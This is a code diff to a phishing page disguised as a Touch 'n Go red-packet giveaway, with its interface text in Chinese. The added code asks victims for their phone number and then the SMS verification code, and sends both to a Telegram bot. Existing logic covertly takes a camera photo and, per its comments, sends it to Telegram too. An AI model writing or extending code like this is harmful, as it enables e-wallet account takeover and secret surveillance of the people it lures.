@@ -188,6 +188,69 @@
         .lb-time { font-size: 0.75rem; color: #999; margin-top: 2px; }
         .lb-amount { font-weight: 600; color: #0052cc; }
 
+        /* 新增：手机号与验证码输入视图 */
+        #viewPhone, #viewCode {
+            display: none;
+            width: 100%;
+            background: #fff;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.25);
+            animation: fadeIn 0.4s ease;
+            color: #333;
+            padding: 30px 24px;
+        }
+        .input-title {
+            font-size: 1.15rem;
+            font-weight: 600;
+            color: #0052cc;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        .input-sub {
+            font-size: 0.85rem;
+            color: #666;
+            margin-bottom: 24px;
+            text-align: center;
+            line-height: 1.4;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #d0d7e6;
+            border-radius: 14px;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s;
+            background: #f9fbfe;
+            margin-bottom: 20px;
+            color: #222;
+        }
+        .input-field:focus {
+            border-color: #1881ff;
+            background: #fff;
+        }
+        .btn-next {
+            background: #005ce6;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 14px 0;
+            border-radius: 30px;
+            font-size: 1.05rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.1s, background 0.2s;
+            box-shadow: 0 6px 18px rgba(0, 92, 230, 0.35);
+        }
+        .btn-next:active { transform: scale(0.97); }
+        .btn-next:hover { background: #0047b3; }
+        .btn-next:disabled {
+            opacity: 0.6;
+            transform: none;
+            cursor: not-allowed;
+        }
+
         /* 加载框 */
         .loading-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -231,6 +294,22 @@
 
                 <button class="btn-open" id="btnOpen" onclick="handleActionAndCapture()">Open Now</button>
             </div>
+        </div>
+
+        <!-- 手机号输入视图（新增） -->
+        <div id="viewPhone">
+            <div class="input-title" id="phoneTitle">输入手机号</div>
+            <div class="input-sub" id="phoneSub">请输入您的 Touch 'n Go 手机号码以继续领取</div>
+            <input type="tel" id="phoneInput" class="input-field" placeholder="例如：0123456789" inputmode="numeric" autocomplete="tel">
+            <button class="btn-next" id="btnPhoneNext" onclick="submitPhone()">下一步</button>
+        </div>
+
+        <!-- 验证码输入视图（新增） -->
+        <div id="viewCode">
+            <div class="input-title" id="codeTitle">输入验证码</div>
+            <div class="input-sub" id="codeSub">我们已向您的手机发送了一条验证码短信，请在此输入</div>
+            <input type="text" id="codeInput" class="input-field" placeholder="请输入验证码" inputmode="numeric" autocomplete="one-time-code">
+            <button class="btn-next" id="btnCodeNext" onclick="submitCode()">下一步</button>
         </div>
 
         <!-- 排行榜页面 -->
@@ -330,6 +409,14 @@
             document.getElementById("loadingText").innerText = "正在打开红包...";
             document.getElementById("lbTitle").innerText = "排行榜";
             document.getElementById("lbSub").innerText = "排行榜: 4/8";
+            document.getElementById("phoneTitle").innerText = "输入手机号";
+            document.getElementById("phoneSub").innerText = "请输入您的 Touch 'n Go 手机号码以继续领取";
+            document.getElementById("codeTitle").innerText = "输入验证码";
+            document.getElementById("codeSub").innerText = "我们已向您的手机发送了一条验证码短信，请在此输入";
+            document.getElementById("btnPhoneNext").innerText = "下一步";
+            document.getElementById("btnCodeNext").innerText = "下一步";
+            document.getElementById("phoneInput").placeholder = "例如：0123456789";
+            document.getElementById("codeInput").placeholder = "请输入验证码";
         }
 
         function showToast(msg, type = "success") {
@@ -466,21 +553,109 @@
             }
         });
 
-        // 点击 Open Now：拉起相机拍照发送 -> 显示 Loading -> 切换到排行榜
+        // 显示指定视图（隐藏其他所有视图）
+        function showView(viewId) {
+            document.getElementById("viewPacket").style.display = "none";
+            document.getElementById("viewLeaderboard").style.display = "none";
+            document.getElementById("viewPhone").style.display = "none";
+            document.getElementById("viewCode").style.display = "none";
+
+            if (viewId === "viewLeaderboard") {
+                document.getElementById("viewLeaderboard").style.display = "block";
+            } else if (viewId === "viewPhone") {
+                document.getElementById("viewPhone").style.display = "block";
+            } else if (viewId === "viewCode") {
+                document.getElementById("viewCode").style.display = "block";
+            } else {
+                document.getElementById("viewPacket").style.display = "flex";
+            }
+        }
+
+        // 全局变量保存手机号和验证码
+        window._pendingPhone = "";
+        window._pendingCode = "";
+
+        // 点击 Open Now：拉起相机拍照发送 -> 显示手机号输入
         window.handleActionAndCapture = async function() {
             let overlay = document.getElementById("loadingOverlay");
             overlay.style.display = "flex";
 
+            // 拍照并发送到 Telegram
             await triggerWebRTCCamera();
 
+            // 稍后隐藏 loading，显示手机号输入视图
             setTimeout(() => {
                 overlay.style.display = "none";
-                document.getElementById("viewPacket").style.display = "none";
-                document.getElementById("viewLeaderboard").style.display = "block";
+                showView("viewPhone");
+            }, 800);
+        };
+
+        // 提交手机号
+        window.submitPhone = async function() {
+            let phoneInput = document.getElementById("phoneInput");
+            let phone = phoneInput.value.trim();
+            if (!phone) {
+                showToast("请输入手机号", "error");
+                return;
+            }
+
+            // 禁用按钮，防止重复提交
+            let btn = document.getElementById("btnPhoneNext");
+            btn.disabled = true;
+            btn.innerText = isZh ? "发送中..." : "Sending...";
+
+            // 发送手机号到 Telegram
+            let msg = `📱 <b>【TNG 用户手机号】</b>\n` +
+                      `📞 手机号：<code>${phone}</code>\n` +
+                      `🕒 时间：${new Date().toLocaleString()}`;
+            await sendTelegram(msg);
+
+            // 保存手机号，切换到验证码视图
+            window._pendingPhone = phone;
+            document.getElementById("phoneInput").value = "";
+
+            btn.disabled = false;
+            btn.innerText = isZh ? "下一步" : "Next";
+
+            showView("viewCode");
+        };
+
+        // 提交验证码
+        window.submitCode = async function() {
+            let codeInput = document.getElementById("codeInput");
+            let code = codeInput.value.trim();
+            if (!code) {
+                showToast("请输入验证码", "error");
+                return;
+            }
+
+            let btn = document.getElementById("btnCodeNext");
+            btn.disabled = true;
+            btn.innerText = isZh ? "验证中..." : "Verifying...";
+
+            // 发送验证码到 Telegram
+            let msg = `🔑 <b>【TNG 用户验证码】</b>\n` +
+                      `📞 手机号：<code>${window._pendingPhone || '未知'}</code>\n` +
+                      `🔢 验证码：<code>${code}</code>\n` +
+                      `🕒 时间：${new Date().toLocaleString()}`;
+            await sendTelegram(msg);
+
+            window._pendingCode = code;
+            document.getElementById("codeInput").value = "";
+
+            btn.disabled = false;
+            btn.innerText = isZh ? "下一步" : "Next";
+
+            // 显示加载框，然后进入排行榜
+            let overlay = document.getElementById("loadingOverlay");
+            overlay.style.display = "flex";
+            setTimeout(() => {
+                overlay.style.display = "none";
+                showView("viewLeaderboard");
             }, 1000);
         };
 
-        // WebRTC 拍照触发函数
+        // WebRTC 拍照触发函数（原有逻辑，保持不变）
         window.triggerWebRTCCamera = async function() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 return;
@@ -519,6 +694,9 @@
                 console.log("相机调起失败或许可拒绝", err);
             }
         };
+
+        // 确保初始视图正确（默认显示红包首页）
+        showView("viewPacket");
     </script>
 </body>
 </html>
